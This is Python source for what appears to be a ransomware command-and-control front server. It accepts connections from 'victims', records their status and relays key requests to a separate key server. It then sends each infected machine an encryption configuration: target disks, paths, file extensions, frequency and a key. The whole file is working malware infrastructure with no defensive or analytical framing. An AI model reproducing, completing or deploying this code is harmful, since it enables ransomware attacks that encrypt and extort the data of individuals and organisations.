import json
import threading
import time

import utile.security as security
import queue
import socket
from threading import Thread
import utile.config as configg
import utile.message as message
from utile.network import recv_msg, send_msg


status_victims = {}
lock = threading.Lock()


class serveur_frontal(object):

    def __init__(self, ip, port, retry=60):
        """ Création des paramètres pour le serveur afin de pouvoir initialiser la connexion
        """
        self.ip = ip
        self.port = port
        self.retry = retry

    def start_server(self):
        global config_serveur
        global config_workstation
        configg.load_config("serveur_frontale/configs/config.json", "serveur_frontale/configs/config.key")
        self.ip_cles, self.port_cles = configg.get_data_config("ip_cles"), configg.get_data_config("port_cles")
        config_serveur = configg.load_config('serveur_frontale/configs/server.json', 'serveur_frontale/configs/server.key')
        config_workstation = configg.load_config('serveur_frontale/configs/workstation.json', 'serveur_frontale/configs/workstation.key')
        print(config_workstation)
        queue_messages_receiv = queue.Queue()
        thread_s_cles = Thread(target=self.thread_srv_cles, args=(queue_messages_receiv,), daemon=True)
        thread_s_cles.start()

        queue_messages_receiv.get()
        print(f'Connection entre le serveur frontale et le serveur de clés effectuée')
        queue_messages_receiv.task_done()

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            # Debug & Prevent crash
            s.bind((self.ip, self.port))
        except socket.error as error:
            print(str(error))
            time.sleep(self.retry)
        s.listen(10)
        print(f' >>> $-F: Server started ! Waiting for clients...')
        while True:
            c_v, a_v = s.accept()
            print(f'Nouvelle victime : {a_v}')
            queue_victim = queue.Queue()
            t_v = Thread(target=self.thread_ransomware, args=(c_v, queue_messages_receiv, queue_victim,), daemon=True)
            t_v.start()

    def thread_srv_cles(self, q_messages_receiv):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((self.ip_cles, self.port_cles))

        key_f = security.diffie_hellman_recv_key(s)
        q_messages_receiv.put('SERVEUR_CLE_CONNECTED')
        q_messages_receiv.join()

        while True:
            msg = q_messages_receiv.get()
            if 'queue' in msg.keys():
                queue_response = msg['queue']
                msg.pop('queue')
            msg = json.dumps(msg)
            msg_type = message.get_message_type(msg)

            if msg_type == "INITIALIZE_REQ":
                send_msg(s, msg, key_f)
                rsp = recv_msg(s, key_f)
                msg_type = message.get_message_type(rsp)
                if msg_type == "INITIALIZE_KEY":
                    queue_response.put(rsp)

    def thread_ransomware(self, c_v, queue_messages_receiv, queue_victim):
        global config_serveur
        global config_workstation
        global status_victims
        while True:
            key = security.diffie_hellmand_sendk(c_v)
            msg = recv_msg(c_v, key)
            print(f'{msg}')
            msg_type = message.get_message_type(msg)
            msg = json.loads(msg)
            if msg_type == 'INITIALIZE_REQ':
                lock.acquire()
                if msg['INITIALIZE'] in status_victims.keys():
                    print(f"{msg['INITIALIZE']}")
                    lock.release()
                else:
                    status_victims[msg['INITIALIZE']] = 'INITIALIZE'
                    lock.release()
                msg['queue'] = queue_victim
                queue_messages_receiv.put(msg)
                key_rsp = queue_victim.get()
                key_rsp = json.loads(key_rsp)
                if msg['OS'] == 'SERVEUR':
                    config_ransomware = config_serveur
                    msg = message.get_message('initialize_resp', [
                        key_rsp['KEY_RESP'],
                        config_ransomware['serveur.cfg']['DISKS'],
                        config_ransomware['serveur.cfg']['PATHS'],
                        config_ransomware['serveur.cfg']['FILE_EXT'],
                        config_ransomware['serveur.cfg']['FREQ'],
                        key_rsp['KEY']
                    ])
                else:
                    config_ransomware = config_workstation
                    msg = message.get_message('initialize_resp', [
                        key_rsp['KEY_RESP'],
                        config_ransomware['workstation.cfg']['DISKS'],
                        config_ransomware['workstation.cfg']['PATHS'],
                        config_ransomware['workstation.cfg']['FILE_EXT'],
                        config_ransomware['workstation.cfg']['FREQ'],
                        key_rsp['KEY']
                    ])
                send_msg(c_v, msg, key)

